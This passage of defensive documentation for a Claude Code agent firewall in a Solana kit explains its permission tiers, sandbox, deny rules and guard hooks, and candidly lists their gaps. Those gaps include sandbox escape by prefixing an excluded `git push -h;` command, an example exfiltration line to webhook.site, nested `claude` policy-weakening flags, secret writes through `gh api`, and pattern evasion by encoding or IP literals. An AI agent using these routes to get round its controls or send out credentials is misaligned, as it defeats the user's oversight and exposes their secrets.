What is deliberately *not* on it: the MCP servers `/setup-mcp` offers. The kit reaches `@playwright/mcp`, `chrome-devtools-mcp`, `@supabase/mcp-server-supabase` and `@phantom/mcp-server` only through `claude mcp add <name> -- npx <pkg>`, whose command word is `claude` — which this guard never treats as a fetch, and whose `claude mcp add` form `Bash(claude mcp add*)` denies at every tier, so the user runs those lines. An entry for them would advertise a gate that does not exist here. `prettier`, `playwright` and `tsc` are absent for the opposite reason: each is a declared devDependency wherever the kit runs it, so `node_modules/.bin` already passes it at every tier — and `tsc` is not even TypeScript's package name, so blessing that npm name would bless a squattable stranger rather than the compiler.

Plugin installs get the hooks only; the permission rules and sandbox come with `install.sh`. `/update` re-applies the tier's rules only when the rule set has been versioned forward: it compares `RULE_SET_VERSION` in the `firewall.sh` it just copied in against `enforced.ruleSetVersion` in your `security.json`, and re-applies only when yours is lower. That apply replaces just the rules the kit itself wrote, so rules you added survive — and because it subtracts what the last apply recorded, a rule set that drops rules, as rule set 10 does, removes them from an existing install as reliably as it adds the new ones. A rule change shipped without bumping `RULE_SET_VERSION` never reaches an install that already has a `security.json`. An install predating the firewall is the separate case: `/update` adopts a tier for it once, and only while its policy is still byte-for-byte the kit's own.

## How a tier is expressed

Nearly every **`Bash(...)`** rule in `permissions.deny` is identical at every tier — the never-allowed set ([`FIREWALL-SPEC.md`](../FIREWALL-SPEC.md) §2 enumerates it) plus the destructive-command rules in the table above. That matters because deny is merge-monotonic: if a rule reaches a user or managed settings file, no descent can take it back out. Most tier variation therefore lives in `sandbox.filesystem`, in two scalars (`permissions.blockReadsOutsideWorkingDirectories` and `sandbox.enabled`), and in the hooks.

Thirteen deny groups are the exception, and they are safe only because `/firewall` owns one file and subtracts exactly the rule strings recorded in `enforced.ruleIds`, so a descent really does remove them: **the self-protection `Edit` rules over the kit's own config (High only — the guard hooks are *not* in this group and are denied at every tier)**, the `Edit` fence over a repository's `.git/config` and `.git/hooks/` (High only), the project dotenv files' `Read` denies (High only) and `Edit` denies (Medium only), `context-mode`'s executor denies and Playwright's two arbitrary primitives (Medium and High), Cloudflare's `execute` and Playwright's `browser_evaluate` (High only), `Bash(gh api *)` (Medium and High), and from rule set 10 the `Read` deny on `gh`'s host file, `kill -9`/`pkill`/`killall`, the container, image and volume removals, and `Bash(bash -c *)` (all four Medium and High). The `relaxed → high → relaxed` and `high → medium` byte-identity tests are what hold that property. The residual is the same for all thirteen: a generated block hand-copied into user or managed scope stops tracking the tier, and those denies then cannot be lifted — so a copied High block means `gh api` stays refused in every project until the copy is edited by hand.

Four groups of `Bash` rules vary. `Bash(gh api *)` arrived in rule set 5 because a glob with no argument form could express the gate while a tier-invariant deny could not pay for it: it is the raw API escape hatch that walks around every narrower `gh` deny, and only the two tiers promising "the agent cannot change your repository" need it closed. The process-kill and container-removal groups followed in rule set 10: stopping a stuck validator and pruning containers are everyday work at Relaxed, so the two diligent tiers carry them and the default tier does not. `Bash(bash -c *)` followed in the same rule set, so a skill's `bash -c` set-up line — memsearch's recall — runs at the default tier; secrets-guard still refuses the agent's own `bash -c` at every tier. Every other `Bash` deny is identical at all four tiers, the `git -C` twins included — see the wrapper note above for why those have to be.

### The maintainer tier

`maintainer` is a fifth value for `security.json`'s `tier`, and it is **only for working on the solana-ai-kit repository itself — never a user project** ([#162](https://github.com/solanabr/ai-kit/issues/162)). The firewall is right for a project and obstructs work on the kit: it denies editing the guard hooks the kit is made of, and `claude mcp add`. No local settings file can lift either, because a `deny` from any scope wins.

It is Relaxed — the default, so maintainers keep dogfooding what users run — minus exactly three denies, plus one sandbox exclusion:

| Change from Relaxed | Why |
|---|---|
| no `Edit(/.claude/hooks/**)` | the project's guard scripts are the kit's source. `~/.claude/hooks/**` stays denied |
| no `Bash(claude mcp add*)` | `/setup-mcp`'s flow, run against the kit itself. Fixture probes (`claude -p`), `claude plugin validate` and `claude --version` need no omission: since rule set 10 every tier denies only a nested `claude` carrying a policy-weakening flag, and those denies stay here, beside fetch-exec-guard's. Through rule set 9 this tier dropped the blanket `Bash(claude *)` and `Bash(claude)` instead, which let an agent start a nested `claude --dangerously-skip-permissions` with no policy at all |
| no `Edit(/.safe-ai-skill/**)` | the kit repo holds the `policy.yaml` `install.sh` ships |
| `git submodule *` in `excludedCommands` | Claude Code's own sandbox refuses shell writes under the project's `.claude/` (measured for `skills/`, `hooks/` and `commands/`, which no kit rule names), so `git submodule update --init` cannot write the packs under `.claude/skills/ext/`. Excluding the command runs it unsandboxed; like every exclusion, that lifts the sandbox for the whole command line |

Everything else, hooks included, is Relaxed's: the hooks read an unknown tier name as `relaxed`. Edits to `.claude/settings.json` and `.claude/security.json` need no change, because Relaxed has permitted them since rule set 4; what remains there is Claude Code's own protected-path prompt.

Four things keep it out of user projects. `firewall.sh` refuses it unless `CLAUDE-solana.md` and `install.sh` sit at the project root, which no install ever creates. `install.sh --tier` does not accept it. `/update` reports a declared `maintainer` and re-applies nothing. And `validate.sh` fails when it is the committed default, since `install.sh` copies the kit's `security.json` into every new project. `/doctor` reports it as a failure on any project, the kit repo included, so it is not forgotten. Adding it changed no other tier's rules, so `RULE_SET_VERSION` stayed at 8.

Switch with `bash .claude/bin/firewall.sh apply maintainer` and restart the session. The generator writes `.claude/settings.json`, which Claude Code protects from sandboxed shell writes, so run it from a separate terminal or with `!` in the prompt. Before committing, restore the two files with `git checkout -- .claude/settings.json .claude/security.json`. That works in a linked worktree too, where `apply relaxed` would not give back the committed bytes: `git_common_write()` adds the machine's absolute `.git` path to the block it generates there. Separately from any tier, a networked `gh` or `git` call runs outside the sandbox only when it is the entire command line. Inside a loop, a pipeline or an `&&` chain it stays sandboxed and fails on the `gh` host file.

## What the tiers do not do

The rest of this document is what the tiers do **not** do. It is here because a security feature that is oversold is worse than one that is understood.

Every row is open in rule set 10 as shipped. The last column names the paragraph below that explains it: the table is an index into the reasoning, not a replacement for it.

**Tiers are regenerated, not layered.** Claude Code merges permission lists across every settings file it loads, and a `deny` from any scope wins: there is no un-deny and no un-ask. So Relaxed cannot be expressed as High plus exceptions — a layered design collapses to the strictest rule any layer ever wrote, permanently, for the life of the file. `/firewall` and `/update` therefore rewrite the whole kit-owned block rather than appending to it, tracked by the exact rule strings recorded in `.claude/security.json` under `enforced.ruleIds`. A rule you added yourself is not in that list, so the rewrite leaves it alone — on the first apply too, which records only what it generated. Until #165 it recorded every rule it found, and the next apply deleted yours; a record written then is repaired on the next apply, which keeps any recorded rule no tier could have written. One case cannot be told apart: a rule byte-identical to a kit rule in the same list. On the first apply it is taken as the kit's; after that, whoever wrote it first owns it. A rule that must survive every tier change belongs in `.claude/settings.local.json`, which the generator never touches.

The generator refuses a user tier in a linked worktree of the kit's own repository: the worktree's git common directory is an absolute path on that machine, and it would land in the `settings.json` every install copies. Regenerate the committed files from a clean non-git copy (`git archive HEAD | tar -x -C "$d"`), or use `maintainer` for local work. A relative path is not the fix — it names a different directory on every machine laid out differently. In a user project's worktree the absolute path is still written, since git needs it there and it is inert anywhere else.

**`.claude/settings.local.json` can only make a tier stricter — with exactly two exceptions.** Because lists merge and deny wins, anything you add in a local file tightens the policy. Two keys are not lists, and these two do loosen it: `sandbox.filesystem.allowRead` re-opens a narrower path inside a denied region (narrowness decides, not source order — this is the only genuine carve-out in the system, and it is how the tiers express themselves); and `sandbox.enabled: false` turns the OS layer off, which a `false` in your own `~/.claude/settings.json` can also do to a project's `true`. That is the whole surface. Nothing else in a local file weakens a tier.

`permissions.blockReadsOutsideWorkingDirectories` is **not** one of them, despite looking like it should be: a `true` in *any* settings source wins, so a local `false` cannot undo High's read fence. It is a one-way ratchet — a repository can turn the fence on for itself and cannot turn yours off, and you cannot turn a project's off either. Turning High's fence off means moving off High.

**What High's read fence actually covers, in three layers.** The file tools — Read, Grep, Glob and LSP — refuse an outside path in every permission mode. Bash refuses one too when the shell parser can resolve the path, and **escalates to a prompt** when it cannot: an inline interpreter (`python3 -c`, `node -e`, `bash -c`, `osascript -e`, …) or a path computed at runtime is unanalysable, so it asks rather than guessing, which in `claude -p` is a refusal. The third layer is the sandbox's own `denyRead` over `/Users/`, `/home/` and `/Volumes/`, and it is the only one of the three that sandbox state changes — turn the sandbox off and the file tools still refuse.

All three are properties of the **tools Claude Code runs itself**. An MCP server is none of them: it reads files in its own process, outside the sandbox and outside the file tools. That is why High and Medium deny `context-mode`'s executor and its `ctx_index` reader by name — without that, a default-on server would take the fence above to zero layers rather than two. See the MCP section below.

**An excluded command lifts the sandbox for the whole command line, not just for itself.** `sandbox.excludedCommands` ships eight entries at Relaxed, Medium and High — `surfpool *`, `anchor test*`, `git push *`, `git pull *`, `git fetch *`, `gh pr *`, `gh run *`, `gh issue *` — and the exclusion is per command *line*, not per statement: `git push -h >/dev/null 2>&1; <denied read>` exits 0 where the bare read gets `EPERM`, reproduced on 2.1.267 against documentation that says every segment must match. So any statement can be taken outside the sandbox by prefixing it with one of the eight. What survives the lift is the hook layer, which segments on `;`, `&&`, `||`, `|` and newline and decides per statement, so the credential corpus is still blocked behind the prefix. What does not survive is everything only the sandbox enforces: its `denyRead` paths outside that corpus, High's `/Users/`, `/home/` and `/Volumes/` fence, `denyWrite`, and the `deniedDomains` exfil list — for a Bash command that list has no hook behind it at all and is enforced at the syscall or nowhere. `git push -h >/dev/null 2>&1; cat ~/Documents/notes.txt` and `git push -h >/dev/null 2>&1; curl https://webhook.site/abc?d=leak` are both silent to every guard. The entries are there because the sandbox cannot reach the ssh-agent socket — nor, at Medium and High, `gh`'s host file — so a sandboxed `git push` cannot authenticate at all, and because `surfpool start` panics on macOS SystemConfiguration inside the sandbox and takes `anchor test`'s Anchor-1.x default path with it. [`FIREWALL-SPEC.md`](../FIREWALL-SPEC.md) §7 item 1 recommends keeping the two entries Surfpool needs and dropping the six git/gh ones, on the grounds that a test-runner escape is a far narrower surface than `git push -h;` prefixing anything. That recommendation has not been applied: all eight ship.

**Only High stops the agent editing the kit's own configuration. The guard hooks are the exception, and they are denied at every tier.** At High, `Edit` is denied on `.claude/settings.json`, `.claude/settings.local.json`, `.claude/security.json`, `.mcp.json` and the user-scope equivalents under `~/.claude/`; **Off, Relaxed and Medium carry none of those**, because below High the kit defers to a user who chose to customize their own installation — the same reasoning that leaves Cloudflare's `execute` callable at Medium. These denies hold under `bypassPermissions`, where protected-path writes are otherwise allowed and allow rules no longer pre-approve them, so an explicit deny is the only thing left.

**`.claude/hooks/**` and `~/.claude/hooks/**` are not part of that, and no tier hands them back.** The reason is not that they are more sensitive than `settings.json` but that they are a different kind of thing. "Customizing your installation" describes `settings.json` exactly — declarative config, tuned by hand. It describes `hooks/` badly: those are executable shell scripts, and the mainnet-deploy gate, the keypair-read block and the egress denylist are *implemented* in them rather than declared. The decisive point is that **`/firewall` already changes every tier knob without touching `hooks/`**, so a user who wants to customize has a supported path that never requires editing a guard script. The line falls between the config and the thing enforcing it, not between strict and lenient.

So below High you own your `.claude/` **configuration**, not the guards: at Relaxed — the default — an agent can rewrite `settings.json` and `.mcp.json`, but an agent that trips the mainnet gate cannot edit the script that produced it. That is the one claim worth being precise about, because the opposite would have made the kit's most emphatic protection (`CLAUDE.md`'s "never deploy to mainnet without explicit user confirmation") editable by the thing it constrains.

The rest of the unconditional set, denied at **every** tier including Off: a nested `claude` started with a policy-weakening flag (`--dangerously-skip-permissions`, `--permission-mode`, `--settings` and the rest, one deny rule per flag, plus `claude mcp add` and `claude setup-token`), since it re-rolls the whole policy in a child process — its package-runner and path-named launches are fetch-exec-guard's, at every tier but Off — while `claude --version`, `claude plugin validate .` and a plain `claude -p`, which inherits these same rules, run; `Edit` on a managed-settings file, which belongs to an administrator rather than the user; and `Edit(.safe-ai-skill/**)`, a third-party security tool's policy whose deep-merge can loosen at least the spend caps, the secret globs, the `curl … | sh` installer gate and the supply-chain scan scope. The mainnet and authority asks hold against a project policy, even one that sets `active_profile: off`. A Bash arm still covers rewriting config files from the shell at every tier.

**Only High stops the file tools writing a repository's git config and hooks.** `.git/config` (`core.hooksPath`, `core.fsmonitor`, `alias.*` and the rest) and `.git/hooks/` both make git run a program later, outside the agent's turn. What already stopped a write there was measured before High's rules were added, and it is most of the answer:

- **Shell writes are refused at every tier that turns the sandbox on, by Claude Code itself.** `access(W_OK)` came back denied on the project's `.git/config`, `.git/hooks/` and a hook inside it, while `HEAD`, `index` and `refs` beside them stayed writable — with no `.git` entry in the kit's `denyWrite` and with `.git` in its `allowWrite`, which Claude Code documents as not lifting its own protected paths. It documents that protection for `hooks` and `config` inside the working directory's own `.git`; a linked worktree's common directory and a monorepo parent's `.git` sit outside it. Below High those stay writable from the shell, deliberately: the kit grants that directory so a first-time `git submodule update --init` works in a linked worktree (shippability gate 4), and the update writes `submodule.<name>.url` into that config. High names the directory absolutely in its `Edit` deny, which reaches the sandbox as a write deny too. Fencing it at every sandboxed tier was tried for rule set 9 and taken back out, because it broke that submodule init at Relaxed and Medium. The fence is scoped to the session's directory: a scratch `.git/config` and `.git/hooks/pre-commit` under `$TMPDIR` were writable. Off has no sandbox at all, and a command line led by an excluded command lifts it for the whole line, as the paragraph above describes.
- **The file tools are not sandboxed.** For Edit, Write and NotebookEdit a path with a `.git` segment is a *protected path*: it prompts in default and `acceptEdits` mode, goes to the classifier in auto mode and is written unasked under `bypassPermissions`, and no allow rule pre-approves it. Only a deny holds in every mode, which is the whole of what High adds: `Edit(**/.git/config)`, `Edit(**/.git/hooks)` and `Edit(**/.git/hooks/**)`, so a nested repository is covered with the project's own.

The rules are deliberately not filesystem-wide. An `Edit` deny also reaches the Bash sandbox as a write deny — measured: `Edit(**/.cargo/config.toml)` refused a shell write while a file beside it stayed writable — so `//**/.git/config` would refuse every `git clone` and `git init` at High, `/update`'s temporary clone and cargo's git checkouts included. A linked worktree is the case project-relative rules miss: its `.git` is a file, and the config and hooks live in a common directory that is usually outside the project. When it is, the apply adds the same three rules for that directory by absolute path — under the same condition `firewall.sh` already adds it to `allowWrite`, so the machine path lands only where that one does, and never in the kit's own committed `settings.json`, which is generated in a clean clone. Residuals: a worktree whose tier was applied in the main checkout rather than in the worktree carries only the relative rules until it is re-applied there; a common directory not named `.git` (a bare repository with linked worktrees) is not matched by the relative rules; and a submodule's git directory under `.git/modules/` and a per-worktree `config.worktree` are outside High's fence — the first because a fence there would refuse submodule initialisation, which [`FIREWALL-SPEC.md`](../FIREWALL-SPEC.md) §5 keeps working on purpose.

Even at High the ceiling is low. A hook matcher is a regex, and `.claude/` is a path Claude Code only *prompts* about — and auto-approves under `bypassPermissions`. The only tier an agent cannot talk its way out of lives in root-owned managed settings (`/Library/Application Support/ClaudeCode/managed-settings.json` and its `.d` directory), which needs root and which the kit will not install for you. What the kit does instead is **detect**: the SessionStart hook compares the tier declared in `.claude/security.json` against what `.claude/settings.json` actually enforces, and `/doctor`'s check 9 fails on a mismatch. Residuals nothing can close from inside a project: `--settings`, `--permission-mode`, `--setting-sources` (excluding a source drops its deny rules *and* its sandbox entries) and `CLAUDE_CONFIG_DIR`, when Claude Code itself is started with them. A nested `claude` the agent starts with any of them is denied — the gate table's nested-`claude` row.

**What High denies under `~/.claude/` is the policy surface, not the whole directory.** It names `settings*.json`, `.credentials.json`, `agents/`, `commands/`, `skills/`, `rules/`, `output-styles/`, `plugins/`, `cowork_plugins/`, `workflows/`, `routines/`, `scheduled_tasks.json`, `daemon.json`, `launch.json`, `loop.md` (the `/loop` prompt, re-run on an interval), `shell-snapshots/` (sourced into every Bash call, so a write there is code execution) and `local/` (where a local `claude` binary lives) — plus `hooks/`, which every tier denies. It deliberately leaves `~/.claude/projects/**/memory/**` — the harness's file-based agent memory — and `~/.claude/CLAUDE.md` writable, along with caches, logs, `plans/` and `keybindings.json`. An earlier blanket `Edit(~/.claude/**)` denied all of those at every tier, which broke agent memory outright and contradicted `CLAUDE-solana.md`'s own instruction to put cross-project preferences in `~/.claude/CLAUDE.md`; since deny beats allow in every scope with no un-deny primitive, nothing could re-open them but removing the glob. Session transcripts are a separate rule and are unaffected: `~/.claude/projects/**/*.jsonl` and `~/.claude/history.jsonl` stay **read**-denied at Medium and High, so the transcripts next to the memory directory remain unreadable.

**What Relaxed actually guarantees** is "your secrets won't additionally reach a third party" — not confidentiality. Relaxed deliberately leaves the project's `.env` readable; that is a product decision, not an oversight. Once a value is read it is in the transcript and has been sent to the model provider. The tier narrows what can happen to that value next; it does not keep it from the model. If you need that, use Medium or High, or keep the secret somewhere the session cannot read.

**Relaxed opens one credential file, to `gh` and to every process the agent runs.** From rule set 10, `gh`'s host file `~/.config/gh/hosts.yml` carries no `Read` deny at Off or Relaxed. That is what lets `gh` start inside the sandbox: Claude Code turns every `Read` deny into a sandbox read deny as well, so the every-tier rule earlier rule sets carried stopped `gh` reading its own configuration, and agents turned the sandbox off to run it. A rule cannot open a file to `gh` alone, so at those two tiers the file — and any token `gh` keeps in it rather than in the system keychain — is readable by every process the agent runs, a dependency's install script included. What keeps the token out of the transcript: at every tier secrets-guard refuses Claude Code's Read and Grep tools on the file in any spelling that reaches it, and a Grep whose search root holds it; `cat` of the file and `gh auth token` are denied, and secrets-guard refuses a command that reads it under a name it recognises. A shell read that reaches the file under a name neither the rules nor the guard recognise is not caught. At every tier but Off, egress-guard refuses a command that sends it. The default wallet `~/.config/solana/id.json` and every other credential file — `~/.npmrc`, `~/.git-credentials`, `~/.netrc`, `~/.aws`, `~/.cargo/credentials*`, `~/.docker/config.json` — stay denied at every tier, Relaxed included, so a command that signs with the default wallet fails inside the sandbox. Medium and High deny the host file again, to the file tools and the sandbox both.

**High is interactive-only; Relaxed is the tier for CI.** What a headless run meets depends on where a prompt comes from. A hook's prompt goes silent when there is no interactive user, at Relaxed, Medium and High (Off runs none of the gate hooks): headless, a Medium force push or a High history rewrite runs unprompted rather than failing, so a hook prompt is no gate in a pipeline. High's two `permissions.ask` rules (before a workflow starts, and before a command is retried outside the sandbox) are rules, not hooks, and under `claude -p` a rule's prompt is a hard failure, not a pause: a High session in a pipeline fails on the first of them. Relaxed emits no `ask` rules at all, so it never fails that way. What holds headless is the deny set. At every tier, Off included: `--final` and the rest of the on-chain refusals, and `solana-keygen --force` over the default wallet. At Relaxed, Medium and High: a mainnet write and an on-chain write to a cluster the hook cannot identify, which are denied unless `CONFIRM_MAINNET=1` is set, and denied at High whether or not it is. At Relaxed: a publish, denied unless `CONFIRM_PUBLISH=1` is set. Medium and High deny publishing outright, so a pipeline on Medium cannot publish even with the variable set.

**How a hook knows it is headless.** The hooks check, in order: `KIT_FIREWALL_HEADLESS` (`1` or `0`); a CI marker such as `CI` or `GITHUB_ACTIONS`; then what Claude Code puts in a hook's environment, `CLAUDE_CODE_SESSION_ATTENDED` (`0` under `claude -p`, `1` in an interactive session) and `CLAUDE_CODE_ENTRYPOINT` (`sdk-cli` under `claude -p`, `sdk-*` from the Agent SDK, `cli` interactively). Those two variables were measured on Claude Code 2.1.286 and are not in its hooks documentation, so a value the hooks do not recognise decides nothing. A terminal probe cannot stand in for them: Claude Code starts each hook as its own session leader with no controlling terminal, so opening `/dev/tty` fails in an interactive session too. The probe is used only as a last resort, and only to let a plain prompt go silent. The denies above need a positive signal. Without one they prompt instead, and a Claude Code headless run refuses a prompt, so an interactive user never gets a deny in place of a prompt. **The cost of that trade-off:** with no signal at all (no CI marker, no `CLAUDE_CODE_SESSION_ATTENDED`, no `CLAUDE_CODE_ENTRYPOINT`), a mainnet write, a write to an unidentified cluster and a Relaxed publish get a prompt where an earlier kit version denied them. That covers an older Claude Code that does not set `CLAUDE_CODE_SESSION_ATTENDED`, and a third-party headless harness. Whether that prompt stops anything is up to the harness: `claude -p` refuses it, and a harness that treats an unanswered prompt as approval does not. **Set `KIT_FIREWALL_HEADLESS=1` in the environment of any such harness**, so the denies apply there. Run CI on Relaxed or Off. The kit's own `.github/workflows/claude.yml` runs inside this repository and therefore runs Relaxed.

### Adding a devnet or testnet RPC provider

`onchain-guard.sh` names devnet and testnet only by an exact moniker (`d`, `devnet`, `t`, `testnet`) or an exact host: `api.devnet.solana.com` and `devnet.helius-rpc.com` for devnet, `api.testnet.solana.com` for testnet. Any other endpoint is an unidentified cluster, because a word inside a URL proves nothing (`https://solana-rpc.publicnode.com/?devnet` is a mainnet endpoint). An unidentified cluster gets an approval prompt interactively, and in a run known to be headless it is denied, at High outright and below it unless `CONFIRM_MAINNET=1`. So a pipeline that deploys to devnet through QuickNode, Alchemy, Triton or its own node is refused until the host is known.

To add one, put its exact host, with no scheme, port or path, in the `case $HNP in` line of `is_devnet()` (or `is_testnet()`) in `.claude/hooks/onchain-guard.sh`. Add only a host that serves that cluster and nothing else: a provider host that also serves mainnet must stay unidentified. `.claude/hooks/` is denied to the agent at every tier, so you make this edit yourself. Setting `CONFIRM_MAINNET=1` for one run also works, but it lifts the gate for mainnet as well.

**Egress: what the kit can enforce, and what it cannot.** A `sandbox.network.deniedDomains` list is honored in every mode, so the known-exfil denylist the kit ships — request bins, tunnel services, paste sites, file drops — does work. An `allowedDomains` allowlist is a different matter: from project scope it only *prompts* in default mode, and under `bypassPermissions` it is inert entirely. `strictAllowlist` would make it deterministic, but it is honored only from user, managed, or `--settings` scope — project settings are ignored, verified against the 2.1.267 binary and the published documentation. So an allowlist is not something the kit can enforce from the files it writes.  `strictAllowlist` is a line *you* add to your own `~/.claude/settings.json`; the kit does not install it, and cannot install it on your behalf. Three primitives survive any destination layer anyway, because their destination is legitimately allowlisted: `npm publish`, `cargo publish`, and `git push` to a remote that was just added (`git remote add tmp <url> && git push tmp HEAD` — both halves sit in `permissions.allow`). Publishing is gated by tier in a hook rather than by a permission rule — Relaxed asks (and denies headless without `CONFIRM_PUBLISH=1`), Medium and High refuse it — because a `deny` rule cannot vary between tiers, so denying it anywhere would deny it at Relaxed too. Data-carrying `curl`/`wget` is gated by a hook anchored to argument position rather than by a glob: Relaxed gates the `@file` and `--upload-file` forms only, because an ask on `curl -d` would fire on `curl -X POST -d '{"jsonrpc":"2.0",...}' https://api.devnet.solana.com`, the most common `curl` in Solana development; inline bodies become ask at Medium and deny at High.

**`gh api` reaches repository secrets at Off, and the `gh secret set` deny does not follow it there.** `permissions.deny` carries `Bash(gh secret set *)` and `Bash(gh variable set *)` at every tier, Off included — the second because the first evades as the variable form. `gh api --method PUT /repos/O/R/actions/secrets/NAME -f encrypted_value=... -f key_id=...` reaches the same endpoint and matches neither, and `Bash(gh *)` is in `permissions.allow`, so the permission layer lets it run with no prompt below Medium. **At Relaxed a hook closes it**: `egress-guard.sh` reads a `gh api` call's method and path together and denies a write to a `secrets` or `variables` endpoint, headless included (see the gate table above); what it leaves open there is an endpoint held whole in a variable and `gh api graphql`. **Medium and High close the route by denying `Bash(gh api *)` outright** — the first of the four tier-varying groups of `Bash` denies, added in rule set 5, and the reason the whole subcommand goes rather than just the mutating methods is given in the gate table above. Only Off, where the hooks are disabled, leaves the route with nothing in front of it. Relaxed keeps the rest of `gh api` open on purpose: it is the tier that has to survive a headless run, and its guarantee was never that the agent cannot change your repository. [`FIREWALL-SPEC.md`](../FIREWALL-SPEC.md) §7 item 2 recorded this as an open call to narrow or accept; it is now closed at Medium and High by the deny, narrowed to the secrets and variables writes at Relaxed by the hook, and accepted at Off.

**MCP: gated by hook and by tier, not by permission rule.** `context-mode` is on by default, and `ctx_execute` runs shell, Python, JavaScript, Ruby, Go, Rust, PHP, Perl, R, Elixir and C# in a subprocess. Three facts decide how far the kit can follow it:

- **A permission rule cannot see arguments.** Tool-*name* globs work (`mcp__context-mode__*`), but there is no argument form, and a `mcp__` rule written with parentheses is **skipped when Claude Code loads the file** — it reads as policy and is none. Only the `--disallowedTools` CLI flag can match an MCP parameter, and the kit cannot ship a CLI flag.
- **A hook can see arguments.** A `PreToolUse` matcher is a regex, so `mcp__context-mode__.*` matches the whole server, and the hook receives the entire `tool_input` on stdin. An earlier version of this page said `ctx_execute` ran "outside every rule and every hook"; the rule half was right and the hook half was wrong.
- **A local server runs outside the OS sandbox** — confirmed, not assumed. `ls ~/.claude/ide` is refused through the Bash tool and succeeds through `ctx_execute`, which can also write under `$HOME`, a path Bash cannot write. So it has *more* reach than Bash, and the syscall layer that catches whatever the Bash patterns miss is simply absent.

So the kit gates it twice. **All four guards now run on `mcp__context-mode__.*` as well as Bash**, against the same corpus: a credential read, the irreversible on-chain set and a mainnet write are caught in a `ctx_execute` payload exactly as in a shell command, and the tier's own `deniedDomains` list is applied to any URL in the payload — the one place the kit has to re-implement the sandbox, because here there is no sandbox. **Medium and High additionally refuse the dangerous tools by name**: `ctx_execute`, `ctx_execute_file`, `ctx_batch_execute`, `ctx_fetch_and_index` and `ctx_index`. That is what makes High's three-layer read fence true again — a tool that reads any path into a searchable store would otherwise take that fence to zero layers, not two. The compression tools stay at every tier: `ctx_search`, `ctx_stats`, `ctx_doctor`, `ctx_purge`, `ctx_insight`, `ctx_upgrade`.

**High also refuses the two opt-in executors Medium leaves callable, and that is the whole of the difference between the two gated tiers.** Cloudflare's [`execute`](configuration.md#optional-mcp-servers) runs JavaScript calling `cloudflare.request()`, which reaches the whole Cloudflare write API — so **High denies `mcp__cloudflare__execute`** while leaving the server's two read-only tools, `docs` and `search`, callable, since documentation lookup is the main reason to attach it. Medium does not deny it. The split is deliberate rather than an oversight: `context-mode` ships on by default, so both gated tiers have to speak for a user who never chose it, whereas attaching Cloudflare means creating an API token and picking its scopes — an explicit decision Medium respects. High makes a stronger claim than Medium ("no arbitrary executor is reachable here"), and an ungated one contradicts that whatever route it arrived by. Two residuals: the `mcp__cloudflare__` prefix is the local server *name* from the documented `claude mcp add … cloudflare` command, so a server added under a different name is not matched; and the `?codemode=false` URL registers ~2,500 per-endpoint tools instead of these three, none of which the rule names. The second High-only tool is Playwright's `browser_evaluate`, in the paragraph below.

**What that leaves open.** At Off and Relaxed the executor is still callable, gated by pattern and nothing else — and a pattern is evadable in a way a syscall is not. A shell payload is matched at full fidelity, but code in another language is best-effort: a credential path built at runtime, base64-decoded, or assembled from variables will walk past the corpus, and the domain list matches hostnames, so an IP literal or a redirect walks past that. If you need the guarantee rather than the gate, run Medium or High, or drop `context-mode` from `.mcp.json`.

Cloudflare's `execute` is denied at High and callable at Off, Relaxed and **Medium** — and there it is gated by nothing at all, not even by pattern: the four guards' `PreToolUse` matcher is `Bash|mcp__context-mode__.*`, so a Cloudflare payload never reaches them. Below High, the token's scopes are the only boundary, which is why [configuration.md](configuration.md#optional-mcp-servers) puts the hardening in the credential. A tool-name deny is all the kit ships for it, because that is the only layer a settings file can express for another server's code executor.

**Playwright's executors are denied at Medium and High.** It is [opt-in](configuration.md#optional-mcp-servers), and three of its tools are in the same class as the two above: `browser_run_code_unsafe` runs caller-supplied code in the Playwright process (the name is upstream's own warning), `browser_network_request` issues an arbitrary HTTP request with an arbitrary method, body and URL, and `browser_evaluate` runs arbitrary JavaScript in the page. **Medium and High deny the first two; High also denies `browser_evaluate`.** `browser_navigate`, `browser_snapshot`, clicking and typing keep working at every tier, which is what [`/test-ts`](../.claude/commands/test-ts.md) and [`/product-review`](../.claude/commands/product-review.md) drive.

Three things worth being precise about. **Medium denies two of the three where it leaves Cloudflare's `execute` alone**, and the opt-in-versus-default split is not the reason it keeps the third: attaching Cloudflare means scoping an API token, which bounds what its executor can reach, while Playwright's `browser_network_request` is bounded by whatever the host can reach and nothing the user picked narrows it. **`browser_evaluate` waits for High because reading state out of a running dApp is ordinary testing** — a wallet adapter's connection state or a canvas-rendered balance is not in a snapshot — so losing it at Medium is real friction that Medium's job (making unfamiliar code safe to read) does not require paying; High's claim is the stronger one and does not survive an in-page JS evaluator, since the page is a remote, attacker-influenced document. And **below Medium there is no pattern layer either**: the guards' matcher is `Bash|mcp__context-mode__.*`, so at Off and Relaxed nothing inspects a Playwright call at all. The usual residuals apply — the `mcp__playwright__` prefix is the local server *name* from [`/setup-mcp`](configuration.md#optional-mcp-servers)'s documented add command, so a server added under another name is not matched, and `chrome-devtools-mcp` is a separate server with its own tool names that no tier gates. The same holds for any other server you attach: the matcher and the tool-name deny have to be written per server, and the kit ships them for `context-mode`, Cloudflare and Playwright.

## Per-harness enforcement

A tier is only as real as the runtime that reads it. Claude Code enforces all of it; Grok Build enforces the hooks and only partly; Codex cannot gate file reads at all; every other Agent Skills client treats the house rules as a request. See [other-agents.md](other-agents.md).
